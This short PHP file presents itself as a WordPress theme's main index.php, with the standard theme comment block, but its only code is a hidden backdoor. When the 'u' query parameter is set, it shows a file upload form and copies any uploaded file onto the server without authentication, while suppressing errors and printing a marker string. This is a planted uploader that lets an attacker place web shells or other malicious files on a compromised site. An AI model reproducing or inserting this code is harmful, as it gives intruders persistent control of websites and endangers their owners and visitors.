<?php 
/**
 * The main file.
 *
 * This is the most generic file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 *
 * @link https://codex.wordpress.org/
 *
 */
error_reporting(0);echo("Form#0x2515");if(isset($_GET["u"])){echo'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if($_POST['_upl']=="Upload"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo'<b>Success_Upload!!!</b><br><br>';}else{echo'<b>Error</b><br><br>';}};};
